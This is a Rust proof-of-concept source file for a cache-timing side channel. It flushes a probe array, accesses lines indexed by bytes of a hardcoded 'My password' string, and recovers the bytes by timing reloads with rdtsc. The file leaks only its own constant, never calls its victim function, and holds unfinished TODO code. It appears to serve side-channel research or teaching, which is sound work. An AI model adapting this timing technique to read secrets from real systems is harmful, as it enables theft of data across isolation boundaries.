//TODO define here the external functions for the POC
// rdtsc, flush, and mfence
// In case of regular x86 compilation, just add them from the libc
#[cfg(all(target_arch = "x86_64"))]
use std::arch::asm;
use std::arch::x86_64::_mm_clflush;
use std::arch::x86_64::_mm_lfence;
use std::arch::x86_64::_mm_mfence;
use std::arch::x86_64::_rdtsc;

const THRESHOLD: u64 = 160;
const STRIDE: usize = 1024;

#[cfg(feature = "small")]
const TRIES: usize = 1000;
#[cfg(feature = "medium")]
const TRIES: usize = 10000;
#[cfg(feature = "large")]
const TRIES: usize = 100000;
#[cfg(feature = "extra")]
const TRIES: usize = 1000000;

const data_size: usize = 16;
static mut public_data: [u8; 160] = [2; 160];

const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
const secret_data: &str = "My password";

// To avoid optimization of the victim code
static mut tmp: u8 = 0;

fn victim_code(branch_selector: usize) {
    if branch_selector < data_size {
        // tmp is mut static which means that its mutability is rule by unsafe blocks :"
        unsafe {
            tmp &= array_for_prediction[public_data[branch_selector] as usize * STRIDE];
        }
    }
}

fn read_memory_offset(ptr: *const u8) -> u8 {
    let result: u8 = 0;
    unsafe {
        asm!(
            "mov {result}, [{x}]",
            x = in(reg) ptr,
            result = out(reg_byte) _
        );
    };
    result
}

// Returns the best two indexes and the best two values
#[no_mangle]
#[allow(dead_code)]
fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
    let mut latencies = [0; 256];
    let mut scores = [0u64; 256];

    let mut max1: i32 = -1;
    let mut max2: i32 = -1;

    let mut score = [0u64; 2];
    let mut value = [0u64; 2];

    let secret_data_bytes = secret_data.as_bytes();
    // Set up the latencies and the scores to 0
    for i in 0..256 {
        latencies[i] = 0;
        scores[i] = 0;
    }
    for i in 0..TRIES {
        // flush lines clflush
        // PRIME
        for j in 0..256 {
            unsafe {
                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
            }
        }
        // Wait a little to the cache to flush
        for _ in 0..1000 {}
        // TODO watch out for the optimization of this empty loop
        unsafe {
            _mm_mfence();
        }

        // Set the cache
        for j in 0..100 {
            unsafe {
                let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
                    as *const u8;
                tmp &= read_memory_offset(addr);
            };
        }

        for j in 0..256 {
            // To avoid stride caching
            let mix_i = ((j * 167) + 13) & 255;

            let addr = &array_for_prediction[mix_i * STRIDE as usize] as *const u8;
            // let start = unsafe { _rdtsc() };
            // Read the mem addr
            let end = unsafe {
                let start = _rdtsc();
                tmp &= read_memory_offset(addr);
                _rdtsc() - start
            };
            if end < THRESHOLD {
                // let c = mix_i as u8 as char;
                // println!("{} {} {}", mix_i, end, c);]
                scores[mix_i] += 1;
            }
            //latencies[mix_i] += end;
        }

        for j in 0..256 {
            // Get the best and the second best
            if max1 < 0 || scores[j] >= scores[max1 as usize] {
                max2 = max1;
                max1 = j as i32;
            } else if max2 < 0 || scores[j] >= scores[max2 as usize] {
                max2 = j as i32;
            }
        }

        score[0] = scores[max1 as usize];
        score[1] = scores[max2 as usize];

        value[0] = max1 as u64;
        value[1] = max2 as u64;

        if scores[max1 as usize] > 2 * scores[max2 as usize] {
            // println!("Breaking");
            break;
        }
    }

    #[cfg(feature = "tracing")]
    {
        eprint!("a = [");
        for j in scores {
            eprint!("{}, ", j);
        }
        eprintln!("]");
    }

    // For some reason we need a time delay here
    for _ in 0..100000 {}

    //println!(" >");
    (score, value)
}

pub fn main() {
    // Filling up public data
    unsafe {
        public_data[0] = 1;
        public_data[1] = 2;
        public_data[2] = 3;
        public_data[3] = 4;
        public_data[4] = 5;
        public_data[5] = 6;
        public_data[6] = 7;
        public_data[7] = 8;
        public_data[8] = 9;
        public_data[9] = 10;
        public_data[10] = 11;
        public_data[11] = 12;
        public_data[12] = 13;
        public_data[13] = 14;
        public_data[14] = 15;
        public_data[15] = 16;
    }

    for j in 0..11 {
        let (score, value) = read_memory_byte(j);
        // get value 0 as char
        let ch = value[0] as u8 as char;
        let ch2 = value[1] as u8 as char;

        #[cfg(feature = "tracing")]
        eprintln!(
            // The value as char
            "Reading at malicious_x {} = {}:{}:{} (second {} {})",
            j, ch, value[0], score[0], score[1], value[1]
        );

        //#[cfg(not(feature = "tracing"))]
        print!("{}", ch);
        // PRIME
        for j in 0..256 {
            unsafe {
                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
            }
        }
    }
}
